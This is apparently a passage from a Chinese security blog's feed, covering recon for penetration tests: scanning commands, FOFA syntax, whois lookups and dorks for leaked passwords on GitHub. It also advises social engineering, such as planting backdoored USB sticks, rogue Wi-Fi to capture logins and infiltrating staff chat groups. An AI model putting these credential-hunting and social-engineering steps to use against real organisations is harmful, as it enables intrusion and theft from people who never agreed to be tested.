class="hljs-string">&quot;resulit.txt&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:<br><br>f.<span class="hljs-built_in">write</span>(ip + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.<span class="hljs-built_in">close</span>()<br><br>for i in data:<br><br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;resulit.txt&quot;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:<br><br>f.<span class="hljs-built_in">write</span>(<span class="hljs-string">&quot;\t&#123;&#125; &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i[<span class="hljs-string">&#x27;domain&#x27;</span>],i[<span class="hljs-string">&#x27;title&#x27;</span>]))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;     [+] &#123;&#125; &#123;&#125;[+]&quot;</span>.<span class="hljs-built_in">format</span>(i[<span class="hljs-string">&#x27;domain&#x27;</span>],i[<span class="hljs-string">&#x27;title&#x27;</span>]))<br><br>f.<span class="hljs-built_in">close</span>()<br><br>def <span class="hljs-built_in">get_ips</span>(ip):<br><br>iplist=[]<br><br>ips_str = ip[:ip.<span class="hljs-built_in">rfind</span>(<span class="hljs-string">&#x27;.&#x27;</span>)]<br><br>for ips in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br><br>ipadd=ips_str + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(ips)<br><br>iplist.<span class="hljs-built_in">append</span>(ipadd)<br><br>return iplist<br><br>ip=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请你输入要查询的ip:&quot;</span>)<br><br>ips=<span class="hljs-built_in">get_ips</span>(ip)<br><br>for p in ips:<br><br><span class="hljs-built_in">get_c</span>(p)<br></code></pre></div></td></tr></table></figure><p><strong>Nmap,Msscan扫描等</strong><br>例如：nmap -p 80,443,8000,8080 -Pn 192.168.0.0&#x2F;24</p><p>常见端口表</p><p>21,22,23,80-90,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2601,2604,3128,3306,3311,3312,3389,4440,4848,5432,5560,5900,5901,5902,6082,6379,7001-7010,7778,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,50030,50060,135,139,445,53,88</p><p>注意：探测C段时一定要确认ip是否归属于目标，因为一个C段中的所有ip不一定全部属于目标。</p><hr><h2 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h2><p>如果想要在短时间内快速收集资产，那么利用网络空间搜索引擎是不错的选择，可以直观地看到旁站，端口，站点标题，IP等信息，点击列举出站点可以直接访问，以此来判断是否为自己需要的站点信息。FOFA的常用语法</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">1、同IP旁站：<span class="hljs-attribute">ip</span>=“192.168.0.1”<br><br>2、C段：<span class="hljs-attribute">ip</span>=“192.168.0.0/24”<br><br>3、子域名：<span class="hljs-attribute">domain</span>=“baidu.com”<br><br>4、标题/关键字：<span class="hljs-attribute">title</span>=“百度”<br><br>5、如果需要将结果缩小到某个城市的范围，那么可以拼接语句<br><br><span class="hljs-attribute">title</span>=“百度”&amp;&amp; <span class="hljs-attribute">region</span>=“Beijing”<br><br>特征：<span class="hljs-attribute">body</span>=<span class="hljs-string">&quot;百度&quot;</span>或header=“baidu”<br></code></pre></div></td></tr></table></figure><hr><h2 id="敏感文件搜索"><a href="#敏感文件搜索" class="headerlink" title="敏感文件搜索"></a>敏感文件搜索</h2><h3 id="GitHub搜索"><a href="#GitHub搜索" class="headerlink" title="GitHub搜索"></a><strong>GitHub搜索</strong></h3><p>in:name test #仓库标题搜索含有关键字test</p><p>in:descripton test #仓库描述搜索含有关键字</p><p>in:readme test #Readme文件搜素含有关键字</p><p>搜索某些系统的密码</p><p><a href="https://github.com/search?q=smtp+58.com+password+3306&type=Code">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</a></p><p>github 关键词监控</p><p><a href="https://www.codercto.com/a/46640.html">https://www.codercto.com/a/46640.html</a></p><h3 id="谷歌搜索"><a href="#谷歌搜索" class="headerlink" title="谷歌搜索"></a><strong>谷歌搜索</strong></h3><p>site:Github.com sa password</p><p>site:Github.com root password</p><p>site:Github.com User ID&#x3D;‘sa’;Password</p><p>site:Github.com inurl:sql</p><h3 id="SVN-信息收集"><a href="#SVN-信息收集" class="headerlink" title="SVN 信息收集"></a><strong>SVN 信息收集</strong></h3><p>site:Github.com svn</p><p>site:Github.com svn username</p><p>site:Github.com svn password</p><p>site:Github.com svn username password</p><h3 id="综合信息收集"><a href="#综合信息收集" class="headerlink" title="综合信息收集"></a><strong>综合信息收集</strong></h3><p>site:Github.com password</p><p>site:Github.com ftp ftppassword</p><p>site:Github.com 密码</p><p>site:Github.com 内部</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a></p><p><a href="http://www.361way.com/github-hack/6284.html">http://www.361way.com/github-hack/6284.html</a></p><p><a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code">https://docs.github.com/cn/github/searching-for-information-on-github/searching-code</a></p><p><a href="https://github.com/search?q=smtp+bilibili.com&type=code">https://github.com/search?q=smtp+bilibili.com&amp;type=code</a></p><h3 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google-hacking"></a><strong>Google-hacking</strong></h3><p>site:域名</p><p>inurl: url中存在的关键字网页</p><p>intext：网页正文中的关键词</p><p>filetype:指定文件类型</p><h3 id="wooyun漏洞库"><a href="#wooyun漏洞库" class="headerlink" title="wooyun漏洞库"></a><strong>wooyun漏洞库</strong></h3><p><a href="https://wooyun.website/">https://wooyun.website/</a><br>联系管理员limanman233可以获得海量漏洞库</p><hr><h3 id="网盘搜索"><a href="#网盘搜索" class="headerlink" title="网盘搜索"></a><strong>网盘搜索</strong></h3><p>凌云搜索 <a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><p>盘多多：<a href="http://www.panduoduo.net/">http://www.panduoduo.net/</a></p><p>盘搜搜：<a href="http://www.pansoso.com/">http://www.pansoso.com/</a></p><p>盘搜：<a href="http://www.pansou.com/">http://www.pansou.com/</a></p><h3 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a><strong>社工库</strong></h3><p>名字&#x2F;常用id&#x2F;邮箱&#x2F;密码&#x2F;电话 登录 网盘 网站 邮箱 找敏感信息</p><p>tg机器人</p><h3 id="社工相关"><a href="#社工相关" class="headerlink" title="社工相关"></a>社工相关</h3><p>微信或者QQ 混入内部群，蹲点观测。加客服小姐姐发一些连接。进一步获取敏感信息。测试产品，购买服务器，拿去测试账号和密码。</p><h3 id="网站注册信息"><a href="#网站注册信息" class="headerlink" title="网站注册信息"></a><strong>网站注册信息</strong></h3><p><a href="http://www.reg007.com查询网站注册信息/">www.reg007.com查询网站注册信息</a></p><p>一般是配合社工库一起来使用。</p><h3 id="js敏感信息"><a href="#js敏感信息" class="headerlink" title="js敏感信息"></a><strong>js敏感信息</strong></h3><p>网站的url连接写到js里面<br>js的api接口 里面包含用户信息 比如 账号和密码</p><p>** jsfinder**<br><a href="https://gitee.com/kn1fes/JSFinder">https://gitee.com/kn1fes/JSFinder</a></p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a></p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d</p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d -ou mi_url.txt -os mi_subdomain.txt</p><p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名</p><p>批量指定URL和JS链接来获取里面的URL。</p><p>指定URL：</p><p>python JSFinder.py -f text.txt</p><p>指定JS：</p><p>python JSFinder.py -f text.txt -j</p><h4 id="Packer-Fuzzer"><a href="#Packer-Fuzzer" class="headerlink" title="Packer-Fuzzer"></a><strong>Packer-Fuzzer</strong></h4><p>寻找网站交互接口 授权key</p><p>随着WEB前端打包工具的流行，您在日常渗透测试、安全服务中是否遇到越来越多以Webpack打包器为代表的网站？这类打包器会将整站的API和API参数打包在一起供Web集中调用，这也便于我们快速发现网站的功能和API清单，但往往这些打包器所生成的JS文件数量异常之多并且总JS代码量异常庞大（多达上万行），这给我们的手工测试带来了极大的不便，Packer Fuzzer软件应运而生。</p><p>本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。</p><p>sudo apt-get install nodejs &amp;&amp; sudo apt-get install npm</p><p>git clone <a href="https://gitee.com/keyboxdzd/Packer-Fuzzer.git">https://gitee.com/keyboxdzd/Packer-Fuzzer.git</a></p><p>pip3 install -r requirements.txt</p><p>python3 PackerFuzzer.py -u <a href="https://www.liaoxuefeng.com/">https://www.liaoxuefeng.com</a></p><h3 id="SecretFinder"><a href="#SecretFinder" class="headerlink" title="SecretFinder"></a><strong>SecretFinder</strong></h3><p>一款基于Python脚本的JavaScript敏感信息搜索工具</p><p><a href="https://gitee.com/mucn/SecretFinder">https://gitee.com/mucn/SecretFinder</a></p><p>python3 SecretFinder.py -i <a href="https://www.baidu.com/">https://www.baidu.com/</a> -e</p><h3 id="github信息泄露监控"><a href="#github信息泄露监控" class="headerlink" title="github信息泄露监控"></a>github信息泄露监控</h3><p><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a></p><p><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a></p><p><a href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a></p><h3 id="物理接触"><a href="#物理接触" class="headerlink" title="物理接触"></a>物理接触</h3><p>到企业办公层连接wifi，连同内网。丢一些带有后门的usb 开放免费的wifi截取账号和密码。</p><hr><h2 id="非常规操作"><a href="#非常规操作" class="headerlink" title="非常规操作"></a>非常规操作</h2><p>1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的body里是否有目标的特征，然后利用网络空间搜索引擎（如fofa等）对该特征进行搜索，如：body&#x3D;”XX公司”或body&#x3D;”baidu”等。</p><p>该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群。</p><p>2、当通过上述方式的找到test.com的特征后，再进行body的搜索，然后再搜索到test.com的时候，此时fofa上显示的ip大概率为test.com的真实IP。</p><p>3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上</p><p><a href="http://114.55.181.28/databaseInfo/index">http://114.55.181.28/databaseInfo/index</a></p><p>之后可以结合上一步的方法进行进一步的信息收集。</p><hr><h2 id="SSL-TLS证书查询"><a href="#SSL-TLS证书查询" class="headerlink" title="SSL&#x2F;TLS证书查询"></a>SSL&#x2F;TLS证书查询</h2><p>SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。</p><p><a href="https://myssl.com/">https://myssl.com/</a></p><p><a href="https://crt.sh/">https://crt.sh</a></p><p><a href="https://censys.io/">https://censys.io</a></p><p><a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a></p><p><a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p><p>SSL证书搜索引擎：</p><p><a href="https://certdb.com/domain/github.com">https://certdb.com/domain/github.com</a></p><p><a href="https://crt.sh/?Identity=%25.baidu.com">https://crt.sh/?Identity=%.baidu.com</a></p><p><a href="https://censys.io/">https://censys.io/</a></p><p>GetDomainsBySSL.py</p><hr><h2 id="移动资产收集"><a href="#移动资产收集" class="headerlink" title="移动资产收集"></a>移动资产收集</h2><h3 id="微信小程序支付宝小程序"><a href="#微信小程序支付宝小程序" class="headerlink" title="微信小程序支付宝小程序"></a><strong>微信小程序支付宝小程序</strong></h3><p>现在很多企业都有小程序，可以关注企业的微信公众号或者支付宝小程序，或关注运营相关人员，查看朋友圈，获取小程序。</p><p><a href="https://weixin.sogou.com/weixin?type=1&ie=utf8&query=%E6%8B%BC%E5%A4%9A%E5%A4%9A">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A</a></p><h3 id="app软件搜索"><a href="#app软件搜索" class="headerlink" title="app软件搜索"></a><strong>app软件搜索</strong></h3><p><a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p><h3 id="社交信息搜索"><a href="#社交信息搜索" class="headerlink" title="社交信息搜索"></a>社交信息搜索</h3><p>QQ群 QQ手机号</p><p>微信群</p><p>领英</p><p><a href="https://www.linkedin.com/">https://www.linkedin.com/</a></p><p>脉脉招聘</p><p>boss招聘</p><hr><h3 id="常用工具推荐"><a href="#常用工具推荐" class="headerlink" title="常用工具推荐"></a>常用工具推荐</h3><h4 id="资产收集神器"><a href="#资产收集神器" class="headerlink" title="资产收集神器"></a>资产收集神器</h4><p>ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统</p><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>AssetsHunter</p><p><a href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p><p>一款用于src资产信息收集的工具</p><p><a href="https://github.com/sp4rkw/Reaper">https://github.com/sp4rkw/Reaper</a></p><p>domain_hunter_pro</p><p><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></p><p>LangSrcCurise</p><p><a href="https://github.com/shellsec/LangSrcCurise">https://github.com/shellsec/LangSrcCurise</a></p><p>网段资产</p><p><a href="https://github.com/colodoo/midscan">https://github.com/colodoo/midscan</a></p><p>Fuzz字典推荐：<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p>BurpCollector(BurpSuite参数收集插件)：<a href="https://github.com/TEag1e/BurpCollector">https://github.com/TEag1e/BurpCollector</a></p><p>Wfuzz：<a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p><p>LinkFinder：<a href="https://github.com/GerbenJavado/LinkFinder">https://github.com/GerbenJavado/LinkFinder</a></p><p>PoCBox：<a href="https://github.com/Acmesec/PoCBox">https://github.com/Acmesec/PoCBox</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透-信息收集（二）</title>
    <link href="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集工具利用"><a href="#信息收集工具利用" class="headerlink" title="信息收集工具利用"></a>信息收集工具利用</h1><h2 id="1、Kali—信息收集"><a href="#1、Kali—信息收集" class="headerlink" title="1、Kali—信息收集"></a>1、Kali—信息收集</h2><p><strong>Robots文件探测</strong><br>获取网站隐藏敏感目录活文件</p><p>比如：安装目录、上传目录、编辑器目录、管理目录、管理页面等</p><p>例：<a href="http://www.baidu.com/robots.txt">www.baidu.com/robots.txt</a></p><h2 id="2、DNS信息收集"><a href="#2、DNS信息收集" class="headerlink" title="2、DNS信息收集"></a>2、DNS信息收集</h2><p>搜集网站域名信息，如子域名，其他域名，解析服务器，区域传送漏洞等</p><p>常用工具：dnsenum、dig、fierce</p><h3 id="Whois信息搜集"><a href="#Whois信息搜集" class="headerlink" title="Whois信息搜集"></a>Whois信息搜集</h3><p>Whois baidu.com</p><p><strong>Dnsenum</strong><br>Dnsenum可以通过字典或谷歌猜测可能存在的域名，并对一个网段进行反查</p><p>Dnsenum –enum baidu.com 获取其他域名<br><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232627779.png" alt="image-20240617232627779"></p><p>-r 允许用户设置递归查询</p><p>-w 允许用户设置whois请求</p><p>-o 允许用户指定输入文件位置</p><hr><h4 id="敏感目录探测"><a href="#敏感目录探测" class="headerlink" title="敏感目录探测"></a>敏感目录探测</h4><p><strong>暴力破解</strong><br>暴力破解的方法就是需要一个强大的目录名称字典，用来尝试逐个匹配，如果存在通过响应码的回显来确定目录或页面是否存在</p><p><strong>目录爬行</strong><br>目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行</p><p><strong>Dirb</strong><br>-a 改变ua 躲避安全狗</p><p>-b指定扫描路径</p><p>-c 指定cookie</p><p>-p 代理设置</p><p>Dirb <a href="http://www.baidu.com-a/">http://www.baidu.com-a</a> Mozilla&#x2F;5.0“</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232650083.png" alt="image-20240617232650083"></p><p>当然也有图形界面的工具</p><p><strong>Dirbuster</strong></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232700021.png" alt="image-20240617232700021"></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><h3 id="整站识别"><a href="#整站识别" class="headerlink" title="整站识别"></a>整站识别</h3><h4 id="Whatweb"><a href="#Whatweb" class="headerlink" title="Whatweb"></a>Whatweb</h4><p>用来识别网站cms及大家平台环境的工具</p><p>Whatweb -v <a href="http://baidu.com/">http://baidu.com</a></p><p>平台、脚本、cms、容器、数据库等信息探测</p><h2 id="Waf探测"><a href="#Waf探测" class="headerlink" title="Waf探测"></a>Waf探测</h2><p>Wafwoof</p><p>用来探测waf等一个工具（不推荐）</p><p>Wafw00f <a href="http://www.baidu.com/">http://www.baidu.com</a></p><hr><h2 id="工具型站的使用"><a href="#工具型站的使用" class="headerlink" title="工具型站的使用"></a>工具型站的使用</h2><h3 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h3><h4 id="信息收集的分类（详细篇）"><a href="#信息收集的分类（详细篇）" class="headerlink" title="信息收集的分类（详细篇）"></a>信息收集的分类（详细篇）</h4><p>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</p><p>网站指纹识别（包括，cms，cdn，证书等） dns记录</p><p>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p><p>子域名收集，旁站，C段等</p><p>google hacking针对化搜索，word&#x2F;电子表格&#x2F;pdf文件，中间件版本，弱口令扫描等</p><p>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</p><p>传输协议，通用漏洞，exp，github源码等</p><hr><h3 id="常见的方法有"><a href="#常见的方法有" class="headerlink" title="常见的方法有"></a>常见的方法有</h3><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p>域名在注册的时候 需要填入个人或者企业信息 如果没有设置隐藏属性可以查询出来 通过备案号 查询个人或者企业信息 也可以whois反查注册人 邮箱 电话 机构 反查更多得域名和需要得信息。</p><h3 id="收集子域名"><a href="#收集子域名" class="headerlink" title="收集子域名"></a>收集子域名</h3><p>域名分为根域名和子域名</p><p>baidu.com 根域名 顶级域名</p><p><a href="http://www.baidu.com子域名/">www.baidu.com子域名</a> 也叫二级域名</p><p><a href="http://www.wiki.baidu.com/">www.wiki.baidu.com</a> 子域名 也叫三级域名 四级如此类推</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h3><p>服务器需要开放服务，就必须开启端口，常见的端口是tcp 和udp两种类型</p><p>范围 0-65535 通过扫得到的端口，访问服务 规划下一步渗透。</p><h3 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a><strong>查找真实ip</strong></h3><p>企业的网站，为了提高访问速度，或者避免黑客攻击，用了cdn服务，用了cdn之后真实服务器ip会被隐藏。</p><h3 id="探测旁站及C段"><a href="#探测旁站及C段" class="headerlink" title="探测旁站及C段"></a><strong>探测旁站及C段</strong></h3><p>旁站:一个服务器上有多个网站 通过ip查询服务器上的网站</p><p>c段:查找同一个段 服务器上的网站。可以找到同样网站的类型和服务器，也可以获取同段服务器进行下一步渗透。</p><h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a><strong>网络空间搜索引擎</strong></h3><p>通过这些引擎查找网站或者服务器的信息，进行下一步渗透。</p><h3 id="扫描敏感目录-文件"><a href="#扫描敏感目录-文件" class="headerlink" title="扫描敏感目录&#x2F;文件"></a><strong>扫描敏感目录&#x2F;文件</strong></h3><p>通过扫描目录和文件，大致了解网站的结构，获取突破点，比如后台，文件备份，上传点。</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a><strong>指纹识别</strong></h3><p>获取网站的版本，属于那些cms管理系统，查找漏洞exp，下载cms进行代码审计。</p><hr><h2 id="在线whois查询"><a href="#在线whois查询" class="headerlink" title="在线whois查询"></a>在线whois查询</h2><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等，因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">站长之家域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>whois.chinaz.com/<br><br>爱站网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.aizhan.com/<br><br>腾讯云域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.cloud.tencent.com/<br><br>美橙互联域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.cndns.com/<br><br>爱名网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">22</span>.cn<span class="hljs-regexp">/domain/</span><br><br>易名网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.ename.net/<br><br>中国万网域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.aliyun.com/<br><br>西部数码域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>whois.west.cn/<br><br>新网域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>whois.xinnet.com<span class="hljs-regexp">/domain/</span>whois/index.jsp<br><br>纳网域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>whois.nawang.cn/<br><br>中资源域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>www.zzy.cn<span class="hljs-regexp">/domain/</span>whois.html<br><br>三五互联域名WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>cp.<span class="hljs-number">35</span>.com<span class="hljs-regexp">/chinese/</span>whois.php<br><br>新网互联域名WHOIS信息查询地址 http:<span class="hljs-regexp">//</span>www.dns.com.cn<span class="hljs-regexp">/show/</span>domain<span class="hljs-regexp">/whois/i</span>ndex.<span class="hljs-keyword">do</span><br><br>国外WHOIS信息查询地址 https:<span class="hljs-regexp">//</span>who.is/<br></code></pre></div></td></tr></table></figure><hr><h2 id="在线网站备案查询"><a href="#在线网站备案查询" class="headerlink" title="在线网站备案查询"></a>在线网站备案查询</h2><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">天眼查 https:<span class="hljs-regexp">//</span>www.tianyancha.com/<br><br>ICP备案查询网http:<span class="hljs-regexp">//</span>www.beianbeian.com/<br><br>爱站备案查询https:<span class="hljs-regexp">//i</span>cp.aizhan.com/<br><br>域名助手备案信息查询 http:<span class="hljs-regexp">//</span>cha.fute.com/<span class="hljs-keyword">index</span><br></code></pre></div></td></tr></table></figure><h3 id="查询绿盟的whois信息"><a href="#查询绿盟的whois信息" class="headerlink" title="查询绿盟的whois信息"></a>查询绿盟的whois信息</h3><p>nsfocus.com.cn</p><p>Whois查询nsfocus.com.cn</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232849247.png" alt="image-20240617232849247"></p><p>通过反查注册人和邮箱得多更多得域名</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617232856379.png" alt="image-20240617232856379"></p><hr><h2 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>当确定了目标大概的ip段后，可以先对ip的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点。</p><h3 id="msscan端口扫描"><a href="#msscan端口扫描" class="headerlink" title="msscan端口扫描"></a><strong>msscan端口扫描</strong></h3><p>msscan -p 1-65535 ip –rate&#x3D;1000</p><p><a href="https://gitee.com/youshusoft/GoScanner/">https://gitee.com/youshusoft/GoScanner/</a></p><h3 id="御剑端口扫描工具"><a href="#御剑端口扫描工具" class="headerlink" title="御剑端口扫描工具"></a><strong>御剑端口扫描工具</strong></h3><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617233420727.png" alt="image-20240617233420727"></p><h3 id="nmap扫描端口和探测端口信息"><a href="#nmap扫描端口和探测端口信息" class="headerlink" title="nmap扫描端口和探测端口信息"></a><strong>nmap扫描端口和探测端口信息</strong></h3><p>常用参数，如：</p><p>nmap -sV 192.168.0.2</p><p>nmap -sT 92.168.0.2</p><p>nmap -Pn -A -sC 192.168.0.2</p><p>nmap -sU -sT -p0-65535 192.168.122.1</p><p>用于扫描目标主机服务版本号与开放的端口</p><p>如果需要扫描多个ip或ip段，可以将他们保存到一个txt文件中</p><p>nmap -iL ip.txt</p><p>来扫描列表中所有的ip。</p><p>Nmap为端口探测最常用的方法，操作方便，输出结果非常直观。</p><h3 id="在线端口检测"><a href="#在线端口检测" class="headerlink" title="在线端口检测"></a><strong>在线端口检测</strong></h3><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617233445208.png" alt="image-20240617233445208"></p><p>御剑，msscan，nmap等</p><p>御剑高速端口扫描器：</p><p>填入想要扫描的ip段（如果只扫描一个ip，则开始IP和结束IP填一个即可），可以选择不改默认端口列表，也可以选择自己指定端口。</p><h2 id="渗透端口"><a href="#渗透端口" class="headerlink" title="渗透端口"></a><strong>渗透端口</strong></h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">152</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5432</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">50070</span>,<span class="hljs-number">50030</span>,<span class="hljs-number">50000</span>,<span class="hljs-number">27017</span>,<span class="hljs-number">27018</span>,<span class="hljs-number">11211</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">9300</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">5984</span>,<span 